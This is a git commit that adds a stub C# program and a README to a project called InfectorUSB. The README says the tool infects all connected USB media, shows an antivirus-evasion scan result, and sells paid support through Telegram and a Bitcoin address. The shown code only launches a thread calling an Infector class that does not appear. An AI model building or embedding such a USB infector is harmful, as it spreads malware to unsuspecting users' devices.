ae989ef4115c68d90e1d87d323e97c451039d988
MadCode <63495195+madcode09@users.noreply.github.com>
2020-05-02 14:20:59 +1100

    Add files via upload

---
+++ InfectorUSB/Program.cs
@@ -0,0 +1,19 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading;
+
+namespace InfectorUSB
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // USB Detector > Infector
+            new Thread(() => { Infector.Initialize(); } ).Start();
+
+            // Your code...
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,9 @@
+## ☣️ Infects all connected USB media
+![](http://dl3.joxi.net/drive/2020/05/02/0039/3040/2595808/08/6c7e63c0a0.jpg)
+![](https://antiscan.me/images/result/FZbrapvTDVu6.png)
+
+### Support paid
+Telegram: @madcod
+BTC: 1JHgjtUed6xD1j9ybRbbXv4ejwRbBiabBG
+
+
